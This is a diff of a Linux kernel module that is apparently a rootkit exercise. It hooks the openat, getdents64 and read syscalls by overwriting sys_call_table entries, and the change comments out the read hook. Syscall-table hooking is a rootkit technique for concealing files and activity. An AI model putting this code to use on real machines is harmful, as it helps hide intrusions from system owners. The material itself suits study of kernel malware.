@@ -123,8 +123,6 @@ asmlinkage ssize_t (*original_read)(struct pt_regs *regs);
 asmlinkage ssize_t sneaky_read(struct pt_regs *regs) {
   int fd = (int)regs->di;
   void *buf = (void *)regs->si;
-  size_t count = (size_t)regs->dx;
-
   struct file *f;
   ssize_t nread;
 
@@ -171,9 +169,9 @@ static int initialize_sneaky_module(void)
   original_getdents64 = (void *)sys_call_table[__NR_getdents64];
   sys_call_table[__NR_getdents64] = (unsigned long)sneaky_getdents64;
 
-  // // // read
-  original_read = (void *)sys_call_table[__NR_read];
-  sys_call_table[__NR_read] = (unsigned long)sneaky_read;
+  // // // // read
+  // original_read = (void *)sys_call_table[__NR_read];
+  // sys_call_table[__NR_read] = (unsigned long)sneaky_read;
 
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);
@@ -190,10 +188,10 @@ static void exit_sneaky_module(void)
   // Turn off write protection mode for sys_call_table
   enable_page_rw((void *)sys_call_table);
 
- 
+  // Restore the original system calls
   sys_call_table[__NR_openat] = (unsigned long)original_openat;
   sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
-  sys_call_table[__NR_read] = (unsigned long)original_read;
+  //sys_call_table[__NR_read] = (unsigned long)original_read;
 
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);
